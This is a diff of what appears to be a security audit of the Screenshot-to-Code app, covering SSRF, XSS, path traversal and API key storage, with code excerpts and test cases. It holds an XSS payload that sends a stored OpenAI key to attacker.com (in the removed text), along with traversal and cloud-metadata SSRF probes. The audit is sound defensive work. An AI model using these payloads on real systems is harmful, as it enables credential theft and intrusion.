@@ -1,184 +1,202 @@
-# Vulnerabilities in Screenshot-to-Code Project
+# VULNERABILITIES
 
-## 1. Cross-Site Scripting (XSS) Vulnerability in User-Provided Code Import
+## Server-Side Request Forgery (SSRF) via Configurable OpenAI Base URL
 
-**Description:**
-The application allows users to import arbitrary code which is then executed in the browser. The imported code is not properly sanitized or validated before being executed, which enables attackers to inject malicious JavaScript code that will execute in the context of the application.
+### Description
+The application allows users to configure a custom OpenAI base URL through the UI settings or environment variables. This URL is passed directly to the OpenAI client without proper validation, which can allow attackers to specify arbitrary URLs and trigger server-side requests to internal resources or unauthorized external services.
 
-**Steps to trigger the vulnerability:**
-1. An attacker crafts a malicious HTML/JavaScript payload containing an XSS attack
-2. The attacker shares this code snippet with a victim, claiming it's a useful component or design
-3. When the victim imports this code using the "Import from code" feature
-4. The code is stored in the application's state and rendered in the browser
-5. The malicious JavaScript executes in the victim's browser context
+To trigger this vulnerability:
+1. Access the publicly available instance of the application
+2. Navigate to the settings dialog (gear icon)
+3. Enter a malicious URL in the OpenAI base URL field (e.g., http://internal-service.local:8080)
+4. Submit the form
+5. Trigger an action that uses the OpenAI API
 
-**Impact:**
-The vulnerability allows attackers to execute arbitrary JavaScript in the victim's browser, which can lead to:
-- Session hijacking
-- Data theft (including API keys stored in the application)
-- Credential harvesting through fake login forms
-- Further client-side exploitation
+The application will make requests to the specified URL when attempting to communicate with OpenAI's API.
 
-**Vulnerability Rank:** High
+### Impact
+This vulnerability allows attackers to:
+- Probe and scan internal network services that shouldn't be accessible from the internet
+- Access and potentially exploit internal systems by leveraging the server's trust relationship
+- Exfiltrate data from internal services
+- Potentially bypass firewall and network security measures
+- Conduct attacks against arbitrary external services using the server as a proxy
 
-**Currently Implemented Mitigations:**
-None. The backend doesn't sanitize or validate imported code, as seen in the `assemble_imported_code_prompt` function in `prompts/__init__.py`. The code is passed directly to the prompt without any sanitization.
+### Vulnerability Rank
+High
 
-**Missing Mitigations:**
-1. Content Security Policy (CSP) implementation to restrict what resources can be loaded
-2. Input validation to ensure imported code doesn't contain malicious patterns
-3. Sandboxing of rendered imported code
-4. Client-side sanitization to strip potentially harmful JavaScript
-
-**Preconditions:**
-- A user must be tricked into importing malicious code
-- The user must be logged in or have stored sensitive information in the application
-
-**Source Code Analysis:**
-In `prompts/__init__.py`, we can see that imported code is directly incorporated into the prompts without sanitization:
-
+### Currently Implemented Mitigations
+There is a partial mitigation for production environments:
 ```python
-def assemble_imported_code_prompt(code: str, stack: Stack) -> list[ChatCompletionMessageParam]:
-    system_content = IMPORTED_CODE_SYSTEM_PROMPTS[stack]
-    user_content = (
-        "Here is the code of the app: " + code
-        if stack != "svg"
-        else "Here is the code of the SVG: " + code
+# Disable user-specified OpenAI Base URL in prod
+if not IS_PROD:
+    openai_base_url = get_from_settings_dialog_or_env(
+        params, "openAiBaseURL", OPENAI_BASE_URL
     )
-    return [
-        {
-            "role": "system",
-            "content": system_content + "\n " + user_content,
-        }
-    ]
 ```
 
-The code is then likely to be rendered or executed in the frontend, as indicated by the "isImportedFromCode" parameter in the `create_prompt` function.
+This disables user-specified base URLs in production environments but still allows custom base URLs in development environments.
 
-**Security Test Case:**
-1. Create a payload containing malicious JavaScript:
-```html
-<html>
-<body onload="alert(document.cookie)">
-<script>
-fetch('https://attacker.com/steal?data=' + localStorage.getItem('openai_api_key'))
-</script>
-<div>Legitimate-looking content</div>
-</body>
-</html>
-```
-2. Save the payload as a file or put it in a code sharing site
-3. Open Screenshot-to-Code application
-4. Use the "Import from code" feature to import the malicious code
-5. Verify that the JavaScript executes, displaying cookies and attempting to exfiltrate API keys
+### Missing Mitigations
+1. URL validation to ensure the base URL matches expected patterns
+2. Allowlist of approved domains for the OpenAI base URL
+3. Network-level restrictions on which hosts the application can contact
+4. Input sanitization to prevent malformed or malicious URLs
 
-## 2. Insecure Storage of API Keys in Local Storage
+### Preconditions
+- The attacker must have access to the application's UI settings
+- The application must be running in a non-production environment (based on IS_PROD flag)
+- The server running the application must have network access to the targeted internal or external resources
 
-**Description:**
-The application stores sensitive API keys (OpenAI, Anthropic, etc.) in the browser's localStorage without encryption, making them accessible to any JavaScript code running on the page, including potential XSS attacks.
+### Source Code Analysis
+Looking at the code flow in `routes/generate_code.py`:
 
-**Steps to trigger vulnerability:**
-1. A user enters their API keys in the application's settings
-2. The application stores these keys in localStorage
-3. An attacker who has achieved XSS through the code import vulnerability or other means can access these keys with a simple JavaScript command: `localStorage.getItem('openai_api_key')`
-4. The attacker can then use these keys to make API calls at the expense of the victim
-
-**Impact:**
-- Financial loss: Attackers can use the victim's API credits to run expensive AI models
-- Data breach: Attackers can access any data the victim has processed with these AI services
-- API abuse: Attackers can perform unauthorized operations using the victim's identity
-
-**Vulnerability Rank:** Critical
-
-**Currently Implemented Mitigations:**
-None. There's no indication of any encryption or secure storage mechanism for API keys in the codebase. The code in `generate_code.py` confirms that API keys are passed from the client side using the settings dialog, reinforcing that these keys are stored client-side.
-
-**Missing Mitigations:**
-1. Encrypt sensitive keys before storing in localStorage
-2. Use secure HTTP-only cookies instead of localStorage for sensitive data
-3. Implement session timeouts for stored credentials
-4. Implement a proxy service that handles API calls without exposing keys to the client
-
-**Preconditions:**
-- The user must have entered API keys into the application
-- The attacker must have a way to execute JavaScript in the context of the application (via XSS)
-
-**Source Code Analysis:**
-In `routes/generate_code.py`, we can see how the application retrieves API keys from client-side settings:
-
+1. The application gets the OpenAI base URL from user settings or environment variables:
 ```python
-def get_from_settings_dialog_or_env(
-    params: dict[str, str], key: str, env_var: str | None
-) -> str | None:
-    value = params.get(key)
-    if value:
-        print(f"Using {key} from client-side settings dialog")
-        return value
-
-    if env_var:
-        print(f"Using {key} from environment variable")
-        return env_var
-
-    return None
-
-# ...
-
-openai_api_key = get_from_settings_dialog_or_env(
-    params, "openAiApiKey", OPENAI_API_KEY
-)
-
-anthropic_api_key = get_from_settings_dialog_or_env(
-    params, "anthropicApiKey", ANTHROPIC_API_KEY
+openai_base_url = get_from_settings_dialog_or_env(
+    params, "openAiBaseURL", OPENAI_BASE_URL
 )
 ```
 
-This confirms that API keys are passed from the client side, which means they must be stored in the browser.
-
-**Security Test Case:**
-1. Save an API key in the application settings
-2. Execute the following JavaScript in the browser console:
-```javascript
-console.log("OpenAI API Key:", localStorage.getItem("openai_api_key"));
-console.log("Anthropic API Key:", localStorage.getItem("anthropic_api_key"));
-console.log("Replicate API Key:", localStorage.getItem("replicate_api_key"));
+2. This URL is passed directly to the OpenAI client without validation:
+```python
+tasks.append(
+    stream_openai_response(
+        prompt_messages,
+        api_key=openai_api_key,
+        base_url=openai_base_url,
+        callback=lambda x, i=index: process_chunk(x, i),
+        model=model,
+    )
+)
 ```
-3. Verify that the keys are displayed in plaintext
-4. Create a malicious code import that contains JavaScript to extract and exfiltrate these keys
 
-## 3. Path Traversal Vulnerability in Evaluation Routes
+3. Inside the `stream_openai_response` function (as referenced in the original vulnerability), the base URL is used to create the OpenAI client:
+```python
+client = AsyncOpenAI(api_key=api_key, base_url=base_url)
+```
 
-**Description:**
-The evaluation routes in the application allow users to specify folder paths that are used directly to access files on the server's filesystem without proper path validation or sanitization. This could allow an attacker to access files outside the intended directories, including sensitive system files.
+When a user initiates an action that uses the OpenAI API, the application will make HTTP requests to whatever URL is specified in the base_url parameter, allowing attackers to target arbitrary hosts.
 
-**Steps to trigger vulnerability:**
-1. An attacker identifies the evaluation endpoints (`/evals`, `/pairwise-evals`, or `/best-of-n-evals`)
-2. The attacker crafts a request with a path parameter containing directory traversal sequences (e.g., `../../etc/passwd`)
-3. The application uses this path directly to access files on the filesystem
-4. The application returns the contents of files outside the intended directory
+### Security Test Case
+To verify this vulnerability:
 
-**Impact:**
-- Unauthorized access to sensitive files on the server
-- Information disclosure about the server's configuration and environment
-- Potential access to application secrets, credentials, or other sensitive data stored on the server
+1. Set up a local instance of the screenshot-to-code application in development mode
+2. Set up a simple HTTP server on a different port (e.g., using Python: `python -m http.server 8081`)
+3. In the application settings, set the OpenAI base URL to `http://localhost:8081`
+4. Upload a screenshot and trigger code generation
+5. Observe your HTTP server logs to confirm it receives requests from the application
 
-**Vulnerability Rank:** High
+If the HTTP server logs show incoming requests that were intended for the OpenAI API, the vulnerability is confirmed. The application is making requests to an arbitrary URL specified by the user without proper validation.
 
-**Currently Implemented Mitigations:**
-None. The code only checks if the provided paths exist but doesn't restrict them to safe directories.
+## Cross-Site Scripting (XSS) via HTML Code Generation and Preview
 
-**Missing Mitigations:**
-1. Path normalization and validation to prevent directory traversal
-2. Restricting file access to specific whitelisted directories
-3. Using a sandbox or virtual filesystem to isolate file operations
-4. Implementation of proper access controls for file operations
+### Description
+The application generates HTML code based on user-provided screenshots, designs, or imported code and then renders this code in the browser preview. Since the application is designed to generate functional code including JavaScript, the generated code is executed when displayed in the preview area. If the AI model generates malicious code or if a user can manipulate the generation process to include malicious scripts, this could lead to XSS attacks.
 
-**Preconditions:**
-- The attacker needs access to the evaluation endpoints
-- The application server must have permission to read the target files
+To trigger this vulnerability:
+1. Craft a screenshot or design that contains elements which might prompt the AI to generate JavaScript code with malicious functionality
+2. Upload the crafted image to the application
+3. The AI generates code which includes the malicious JavaScript
+4. The code is executed in the browser when displayed in the preview pane
 
-**Source Code Analysis:**
-In `routes/evals.py`, we can see several instances where user-provided paths are used directly without proper validation:
+### Impact
+An attacker could:
+- Execute arbitrary JavaScript in the context of other users' browsers
+- Steal sensitive information such as API keys entered in the settings
+- Perform actions on behalf of other users
+- Redirect users to phishing sites
+- Install client-side malware or cryptominers
 
+### Vulnerability Rank
+High
+
+### Currently Implemented Mitigations
+None. The application is specifically designed to generate and execute HTML and JavaScript code.
+
+### Missing Mitigations
+1. Content Security Policy (CSP) to restrict what resources can be loaded and executed
+2. Sandboxing the preview iframe with appropriate restrictions
+3. Validation and sanitization of AI-generated code before rendering
+4. Warning users about the risks of executing generated code
+
+### Preconditions
+- The attacker must be able to influence what content is processed by the AI model
+- The victim must view the generated code in the application's preview pane
+
+### Source Code Analysis
+The application takes user input (screenshots, designs, or imported code) and sends it to AI models to generate HTML, CSS, and JavaScript code. This generated code is then displayed in the browser where it is executed.
+
+From the project's structure and purpose, specifically in `routes/generate_code.py`:
+
+1. The application takes user-provided images or designs
+2. It processes these inputs through AI models to generate code
+3. The generated code is sent back to the frontend via WebSocket:
+```python
+for index, updated_html in enumerate(updated_completions):
+    await send_message("setCode", updated_html, index)
+    await send_message("status", "Code generation complete.", index)
+```
+
+4. Since the application is specifically designed to create functional websites with interactive elements, this code includes JavaScript that is executed when rendered
+
+Since the AI model could potentially generate harmful code (either by being explicitly manipulated or through unexpected behaviors), and this code is executed in the browser, this creates an XSS risk.
+
+### Security Test Case
+To verify this vulnerability:
+
+1. Create an image containing visual elements that suggest a website with interactive JavaScript (e.g., a form with buttons, counters, etc.)
+2. Upload this image to the application
+3. Examine the generated code for any JavaScript functions
+4. Modify the generated code to include a simple test alert: `<script>alert('XSS Test')</script>`
+5. If the alert executes in the preview pane, this confirms that arbitrary JavaScript can be executed
+
+For a more advanced test, try to craft an image that would suggest to the AI to include JavaScript event handlers or scripts that could access cookies or perform other sensitive operations, and see if the generated code includes these elements and if they execute.
+
+## Path Traversal in Evaluation Routes
+
+### Description
+The application allows users to specify arbitrary file paths in several API endpoints in the evaluation routes. These paths are used directly to read files from the filesystem without proper validation or path normalization, which can lead to path traversal attacks where attackers can read files outside the intended directories.
+
+To trigger this vulnerability:
+1. Access the publicly available API endpoints in `routes/evals.py`
+2. Provide a path parameter that uses path traversal sequences (e.g., `../../../etc/passwd`)
+3. The application will attempt to read files from this path
+4. If successful, the contents of sensitive files can be exposed to the attacker
+
+### Impact
+This vulnerability allows attackers to:
+- Read sensitive files from the server's filesystem
+- Access configuration files containing API keys or credentials
+- Obtain information about the server's internal structure
+- Potentially get access to user data or business logic files
+- Escalate the attack by discovering additional vulnerabilities through exposed code
+
+### Vulnerability Rank
+High
+
+### Currently Implemented Mitigations
+The application performs existence checks on paths but does not restrict where these paths can point:
+```python
+folder_path = Path(folder)
+if not folder_path.exists():
+    raise HTTPException(status_code=404, detail=f"Folder not found: {folder}")
+```
+
+### Missing Mitigations
+1. Path validation to ensure paths are within allowed directories
+2. Path normalization to resolve and check for directory traversal attempts
+3. Restricting file access to specific directories using a whitelist approach
+4. Implementing proper access controls for file operations
+
+### Preconditions
+- The attacker must have access to the API endpoints
+- The application must be running with sufficient filesystem permissions to access the targeted files
+
+### Source Code Analysis
+In `routes/evals.py`, several endpoints take folder paths directly from user input:
+
+1. The `/evals` endpoint takes a folder parameter with no path validation beyond checking existence:
 ```python
 @router.get("/evals", response_model=list[Eval])
 async def get_evals(folder: str):
@@ -188,117 +206,58 @@ async def get_evals(folder: str):
     folder_path = Path(folder)
     if not folder_path.exists():
         raise HTTPException(status_code=404, detail=f"Folder not found: {folder}")
+
+    # ...proceeds to read files from this folder
 ```
 
-Similar patterns exist in the `get_pairwise_evals` and `get_best_of_n_evals` functions:
-
+2. The `/pairwise-evals` endpoint has even more concerning default values:
 ```python
 @router.get("/pairwise-evals", response_model=PairwiseEvalResponse)
 async def get_pairwise_evals(
-    folder1: str = Query(...),
-    folder2: str = Query(...),
+    folder1: str = Query(
+        "...",
+        description="Absolute path to first folder",
+    ),
+    folder2: str = Query(
+        "..",
+        description="Absolute path to second folder",
+    ),
 ):
     if not os.path.exists(folder1) or not os.path.exists(folder2):
         return {"error": "One or both folders do not exist"}
 ```
 
-These checks only verify that the paths exist but don't restrict them to safe directories. Later, these paths are used to read files:
+The default values are `"..."` and `".."` which are parent directories, and the description even specifies "Absolute path" encouraging users to provide full paths.
 
+3. The `/best-of-n-evals` endpoint takes an arbitrary number of folder paths:
 ```python
-# Get all HTML files from folder
-files = {
-    f: os.path.join(folder, f)
-    for f in os.listdir(folder)
-    if f.endswith(".html")
-}
+@router.get("/best-of-n-evals", response_model=BestOfNEvalsResponse)
+async def get_best_of_n_evals(request: Request):
+    # Get all query parameters
+    query_params = dict(request.query_params)
 
-# ...
-
-with open(output_file, "r", encoding="utf-8") as f:
-    output_html = f.read()
+    # Extract all folder paths (folder1, folder2, folder3, etc.)
+    folders = []
+    i = 1
+    while f"folder{i}" in query_params:
+        folders.append(query_params[f"folder{i}"])
+        i += 1
 ```
 
-**Security Test Case:**
-1. Identify the `/evals` endpoint
-2. Craft a request with a traversal path: `GET /evals?folder=../../../etc/passwd`
-3. Observe if the application returns the contents of the password file or other system files
-4. Try alternative traversal patterns (`..%2f..%2f` etc.) if direct traversal is blocked
-5. Map out accessible files by trying different paths
+In all these cases, the application reads files from these paths without validating that they are within allowed directories, creating a path traversal vulnerability.
 
-## 4. Server-Side Request Forgery (SSRF) in Screenshot API
+### Security Test Case
+To verify this vulnerability:
 
-**Description:**
-The screenshot API endpoint accepts a URL parameter from users without proper validation and uses it to make requests to an external screenshot service. This could allow attackers to probe internal networks or access internal services by manipulating the target URL.
+1. Identify a sensitive file on the system that should not be accessible (e.g., `/etc/passwd` on Linux)
+2. Craft a path traversal request to one of the vulnerable endpoints:
+   ```
+   GET /evals?folder=../../../etc
+   ```
+3. If the endpoint returns file contents from outside the intended directory, the vulnerability is confirmed
 
-**Steps to trigger vulnerability:**
-1. An attacker sends a POST request to the `/api/screenshot` endpoint
-2. The request contains a URL pointing to an internal service (e.g., `http://localhost:8080` or `http://10.0.0.1`)
-3. The application forwards this URL to the screenshot service
-4. If the screenshot service allows access to non-public URLs, it captures and returns content from internal services
-
-**Impact:**
-- Access to internal services that are not exposed to the internet
-- Information disclosure about internal network topology
-- Potential access to sensitive internal endpoints
-- Bypassing network security controls
-
-**Vulnerability Rank:** High
-
-**Currently Implemented Mitigations:**
-None. The code doesn't validate the URL parameter before passing it to the screenshot service.
-
-**Missing Mitigations:**
-1. URL validation to ensure only public, allowed domains are processed
-2. Deny list for private IP ranges and localhost
-3. URL scheme validation (only allow http/https)
-4. Rate limiting to prevent abuse of the screenshot service
-
-**Preconditions:**
-- The screenshot service (screenshotone.com) must allow capturing non-public URLs
-- The application server or the screenshot service must have access to the internal networks
-
-**Source Code Analysis:**
-In `routes/screenshot.py`, we can see that the URL is passed directly to the screenshot service without validation:
-
-```python
-@router.post("/api/screenshot")
-async def app_screenshot(request: ScreenshotRequest):
-    # Extract the URL from the request body
-    url = request.url
-    api_key = request.apiKey
-
-    # TODO: Add error handling
-    image_bytes = await capture_screenshot(url, api_key=api_key)
-
-    # ...
-```
-
-The `capture_screenshot` function uses this URL directly:
-
-```python
-async def capture_screenshot(
-    target_url: str, api_key: str, device: str = "desktop"
-) -> bytes:
-    api_base_url = "https://api.screenshotone.com/take"
-
-    params = {
-        "access_key": api_key,
-        "url": target_url,
-        # ...
-    }
-```
-
-**Security Test Case:**
-1. Send a POST request to `/api/screenshot` with a payload targeting an internal service:
-```json
-{
-  "url": "http://localhost:8080/admin",
-  "apiKey": "valid-screenshot-api-key"
-}
-```
-2. Try alternative URLs including:
-   - `http://127.0.0.1:22`
-   - `http://10.0.0.1`
-   - `http://169.254.169.254/latest/meta-data/` (AWS metadata service)
-3. Check if the response contains screenshots of internal services
-4. If direct access is blocked, try URL encoding or other obfuscation techniques
+For a more targeted test:
+1. Set up a local instance of the application
+2. Create a test file in a parent directory that should not be accessible
+3. Make a request to the `/pairwise-evals` endpoint with paths pointing to this file
+4. Check if the application returns the contents of the test file
